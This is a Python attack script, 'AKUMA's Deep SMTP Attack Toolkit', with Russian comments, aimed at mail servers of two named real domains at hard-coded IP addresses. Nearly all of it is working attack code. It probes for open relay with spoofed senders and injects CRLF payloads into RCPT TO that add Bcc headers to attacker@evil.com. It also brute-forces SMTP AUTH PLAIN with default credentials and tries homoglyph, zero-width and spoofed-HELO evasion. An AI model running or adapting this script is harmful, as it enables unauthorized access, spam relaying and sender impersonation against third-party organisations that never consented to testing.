#!/usr/bin/env python3
"""
AKUMA's Deep SMTP Attack Toolkit 💀
Продвинутые техники обхода для открытых SMTP серверов
Специально для psas.cz и becht.com
"""

import socket
import time
import base64
import random
import string

class DeepSMTPAttacker:
    def __init__(self, timeout=15):
        self.timeout = timeout
        
        # Найденные открытые сервера
        self.targets = [
            {"domain": "psas.cz", "ip": "93.185.102.225", "ports": [25, 465]},
            {"domain": "becht.com", "ip": "198.12.235.42", "ports": [25, 587, 465]}
        ]
        
        # Различные payload'ы для тестирования
        self.test_emails = [
            "admin@gmail.com", "test@yahoo.com", "noreply@microsoft.com",
            "security@apple.com", "info@amazon.com", "alert@paypal.com"
        ]
        
        # HELO/EHLO variations
        self.helo_variations = [
            "localhost", "127.0.0.1", "[127.0.0.1]", "mail.gmail.com",
            "smtp.office365.com", "internal.local", "trusted.domain.com"
        ]
        
        # Различные техники обхода
        self.evasion_techniques = []
    
    def banner(self):
        """Хакерский баннер"""
        print("🔥" * 60)
        print("💀 AKUMA's Deep SMTP Attack Toolkit v2.0 💀")
        print("Advanced Evasion Techniques for SMTP Servers")
        print("🔥" * 60)
        print()
    
    def generate_random_email(self, domain=None):
        """Генерируем случайный email"""
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        if domain:
            return f"{username}@{domain}"
        return f"{username}@external.com"
    
    def test_basic_relay(self, sock, target_domain):
        """Базовое тестирование relay с разными техниками"""
        print("    🔍 Testing basic relay patterns...")
        
        relay_tests = [
            # Классические relay тесты
            ("akuma@external.com", "victim@external.com"),
            (f"internal@{target_domain}", "victim@external.com"),
            ("", "victim@external.com"),  # Пустой sender
            
            # Domain spoofing attempts
            (f"admin@mail.{target_domain}", "victim@external.com"),
            (f"system@smtp.{target_domain}", "victim@external.com"),
            (f"noreply@{target_domain}", "victim@external.com"),
            
            # Различные форматы
            ("<admin@external.com>", "victim@external.com"),
            ("admin@external.com (Admin User)", "victim@external.com"),
            ("\"admin\"@external.com", "victim@external.com"),
        ]
        
        vulnerabilities = []
        
        for from_addr, to_addr in relay_tests:
            try:
                # MAIL FROM
                if from_addr == "":
                    cmd = "MAIL FROM:<>\r\n"
                else:
                    cmd = f"MAIL FROM:<{from_addr}>\r\n"
                
                sock.send(cmd.encode())
                time.sleep(0.5)
                mail_response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '250' in mail_response:
                    print(f"        ✅ MAIL FROM accepted: {from_addr}")
                    
                    # RCPT TO
                    sock.send(f"RCPT TO:<{to_addr}>\r\n".encode())
                    time.sleep(0.5)
                    rcpt_response = sock.recv(1024).decode('utf-8', errors='ignore')
                    
                    if '250' in rcpt_response:
                        vuln = {
                            'type': 'basic_relay',
                            'from': from_addr,
                            'to': to_addr,
                            'response': rcpt_response.strip()
                        }
                        vulnerabilities.append(vuln)
                        print(f"        🚨 RELAY VULNERABILITY: {from_addr} -> {to_addr}")
                        print(f"        📝 Response: {rcpt_response.strip()}")
                    else:
                        print(f"        ❌ RCPT TO rejected: {rcpt_response.strip()[:50]}")
                else:
                    print(f"        ❌ MAIL FROM rejected: {mail_response.strip()[:50]}")
                    
            except Exception as e:
                print(f"        ⚠️  Error testing {from_addr}: {e}")
                continue
        
        return vulnerabilities
    
    def test_header_injection(self, sock, target_domain):
        """Тестирование header injection"""
        print("    💉 Testing header injection...")
        
        injection_payloads = [
            f"test@{target_domain}\r\nBcc: attacker@evil.com",
            f"test@{target_domain}\r\nX-Injected: true\r\nTo: victim@external.com",
            f"test@{target_domain} (Injected\r\nBcc: evil@hacker.com)",
            f"test@{target_domain}\nCc: injected@malicious.com",
        ]
        
        vulnerabilities = []
        
        for payload in injection_payloads:
            try:
                sock.send(f"MAIL FROM:<akuma@test.com>\r\n".encode())
                time.sleep(0.5)
                mail_response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '250' in mail_response:
                    sock.send(f"RCPT TO:<{payload}>\r\n".encode())
                    time.sleep(0.5)
                    rcpt_response = sock.recv(1024).decode('utf-8', errors='ignore')
                    
                    if '250' in rcpt_response:
                        vuln = {
                            'type': 'header_injection',
                            'payload': payload,
                            'response': rcpt_response.strip()
                        }
                        vulnerabilities.append(vuln)
                        print(f"        🚨 HEADER INJECTION: {payload}")
                    else:
                        print(f"        ❌ Injection blocked: {payload[:30]}...")
            except Exception:
                continue
        
        return vulnerabilities
    
    def test_auth_bypass(self, sock):
        """Тестирование слабых паролей для аутентификации"""
        print("    🔓 Testing authentication bypass...")
        
        # Слабые креды
        weak_creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("test", "test"), ("mail", "mail"), ("smtp", "smtp"),
            ("user", "password"), ("guest", "guest"), ("", ""),
        ]
        
        vulnerabilities = []
        
        for username, password in weak_creds:
            try:
                # AUTH PLAIN
                if username == "" and password == "":
                    auth_string = base64.b64encode(b"\x00\x00").decode()
                else:
                    auth_string = base64.b64encode(f"\x00{username}\x00{password}".encode()).decode()
                
                sock.send(f"AUTH PLAIN {auth_string}\r\n".encode())
                time.sleep(1)
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '235' in response:  # Authentication successful
                    vuln = {
                        'type': 'auth_bypass',
                        'username': username,
                        'password': password,
                        'response': response.strip()
                    }
                    vulnerabilities.append(vuln)
                    print(f"        🚨 WEAK AUTH: {username}:{password}")
                    return vulnerabilities  # Нашли - больше не тестируем
                else:
                    print(f"        ❌ Auth failed: {username}:{password}")
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def test_address_obfuscation(self, sock, target_domain):
        """Тестирование обфускации адресов"""
        print("    🎭 Testing address obfuscation...")
        
        obfuscated_addresses = [
            # IP адреса вместо доменов
            "test@[127.0.0.1]", "test@192.168.1.1", "test@[::1]",
            
            # URL encoding
            f"test%40{target_domain}",
            f"test@{target_domain.replace('.', '%2E')}",
            
            # Unicode/special chars
            f"tеst@{target_domain}",  # Cyrillic 'е' instead of 'e'
            f"test@{target_domain}\u200b",  # Zero-width space
            
            # Different formats
            f"<test@{target_domain}>",
            f"test@{target_domain} (Real Name)",
            f"\"test user\"@{target_domain}",
        ]
        
        vulnerabilities = []
        
        for addr in obfuscated_addresses:
            try:
                sock.send(f"MAIL FROM:<akuma@test.com>\r\n".encode())
                time.sleep(0.5)
                mail_response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '250' in mail_response:
                    sock.send(f"RCPT TO:<{addr}>\r\n".encode())
                    time.sleep(0.5)
                    rcpt_response = sock.recv(1024).decode('utf-8', errors='ignore')
                    
                    if '250' in rcpt_response:
                        vuln = {
                            'type': 'address_obfuscation',
                            'address': addr,
                            'response': rcpt_response.strip()
                        }
                        vulnerabilities.append(vuln)
                        print(f"        🚨 OBFUSCATION BYPASS: {addr}")
                    else:
                        print(f"        ❌ Obfuscation blocked: {addr[:30]}...")
            except Exception:
                continue
        
        return vulnerabilities
    
    def test_helo_variations(self, ip, port, domain):
        """Тестирование с различными HELO именами"""
        print("    🌐 Testing HELO variations...")
        
        vulnerabilities = []
        
        for helo_name in self.helo_variations:
            try:
                print(f"        🔍 Testing HELO: {helo_name}")
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((ip, port))
                
                # Читаем баннер
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                
                # Пробуем HELO
                sock.send(f"HELO {helo_name}\r\n".encode())
                time.sleep(1)
                helo_response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '250' in helo_response:
                    print(f"            ✅ HELO accepted: {helo_name}")
                    
                    # Тестируем relay с этим HELO
                    sock.send(b"MAIL FROM:<test@external.com>\r\n")
                    time.sleep(0.5)
                    mail_response = sock.recv(1024).decode('utf-8', errors='ignore')
                    
                    if '250' in mail_response:
                        sock.send(b"RCPT TO:<victim@external.com>\r\n")
                        time.sleep(0.5)
                        rcpt_response = sock.recv(1024).decode('utf-8', errors='ignore')
                        
                        if '250' in rcpt_response:
                            vuln = {
                                'type': 'helo_variation',
                                'helo_name': helo_name,
                                'response': rcpt_response.strip()
                            }
                            vulnerabilities.append(vuln)
                            print(f"            🚨 HELO BYPASS: {helo_name}")
                else:
                    print(f"            ❌ HELO rejected: {helo_name}")
                
                sock.send(b"QUIT\r\n")
                sock.close()
                
            except Exception as e:
                print(f"        ⚠️  Error with HELO {helo_name}: {e}")
                continue
        
        return vulnerabilities
    
    def comprehensive_attack(self, target):
        """Комплексная атака на один сервер"""
        print(f"\n🎯 Comprehensive attack on {target['domain']} ({target['ip']})")
        print("=" * 60)
        
        all_vulnerabilities = []
        
        for port in target['ports']:
            print(f"\n📡 Testing port {port}...")
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((target['ip'], port))
                
                # Читаем баннер
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                print(f"    📝 Banner: {banner.strip()}")
                
                # EHLO
                sock.send(b"EHLO akuma-deep-scan.com\r\n")
                time.sleep(1)
                ehlo_response = sock.recv(2048).decode('utf-8', errors='ignore')
                
                if '250' in ehlo_response:
                    print(f"    ✅ EHLO successful")
                    print(f"    📋 Server capabilities: {ehlo_response.count('250')} features")
                    
                    # Запускаем все тесты
                    vulns = []
                    
                    # 1. Basic relay
                    vulns.extend(self.test_basic_relay(sock, target['domain']))
                    
                    # 2. Header injection
                    vulns.extend(self.test_header_injection(sock, target['domain']))
                    
                    # 3. Auth bypass (если поддерживается)
                    if 'AUTH' in ehlo_response.upper():
                        vulns.extend(self.test_auth_bypass(sock))
                    
                    # 4. Address obfuscation
                    vulns.extend(self.test_address_obfuscation(sock, target['domain']))
                    
                    all_vulnerabilities.extend(vulns)
                    
                    print(f"    📊 Port {port} vulnerabilities: {len(vulns)}")
                else:
                    print(f"    ❌ EHLO failed: {ehlo_response.strip()}")
                
                sock.send(b"QUIT\r\n")
                sock.close()
                
            except Exception as e:
                print(f"    💥 Connection error on port {port}: {e}")
        
        # 5. HELO variations (separate connections)
        helo_vulns = self.test_helo_variations(target['ip'], target['ports'][0], target['domain'])
        all_vulnerabilities.extend(helo_vulns)
        
        return all_vulnerabilities
    
    def run_deep_attack(self):
        """Запуск полной атаки"""
        self.banner()
        
        print(f"🚀 Starting deep attack on {len(self.targets)} vulnerable servers...")
        print()
        
        total_vulns = []
        
        for target in self.targets:
            vulns = self.comprehensive_attack(target)
            total_vulns.extend(vulns)
        
        self.generate_report(total_vulns)
    
    def generate_report(self, vulnerabilities):
        """Генерируем финальный отчёт"""
        print("\n" + "🔥" * 60)
        print("📊 AKUMA's Deep Attack Results Report")
        print("🔥" * 60)
        
        if not vulnerabilities:
            print("✅ No advanced vulnerabilities detected!")
            print("🛡️  All tested servers are properly secured against evasion techniques.")
        else:
            print(f"🚨 CRITICAL: {len(vulnerabilities)} advanced vulnerabilities found!")
            print()
            
            # Группируем по типам
            vuln_types = {}
            for vuln in vulnerabilities:
                vtype = vuln['type']
                if vtype not in vuln_types:
                    vuln_types[vtype] = []
                vuln_types[vtype].append(vuln)
            
            for vtype, vulns in vuln_types.items():
                print(f"🎭 {vtype.upper()}: {len(vulns)} vulnerabilities")
                for vuln in vulns[:3]:  # Show first 3
                    if vtype == 'basic_relay':
                        print(f"   • {vuln['from']} -> {vuln['to']}")
                    elif vtype == 'auth_bypass':
                        print(f"   • {vuln['username']}:{vuln['password']}")
                    elif vtype == 'header_injection':
                        print(f"   • {vuln['payload'][:40]}...")
                    elif vtype == 'helo_variation':
                        print(f"   • HELO: {vuln['helo_name']}")
                print()
        
        print("💀 As AKUMA says: 'If basic security fails, evasion techniques reveal the truth!'")
        print("🔥" * 60)

def main():
    attacker = DeepSMTPAttacker()
    attacker.run_deep_attack()

if __name__ == "__main__":
    main()
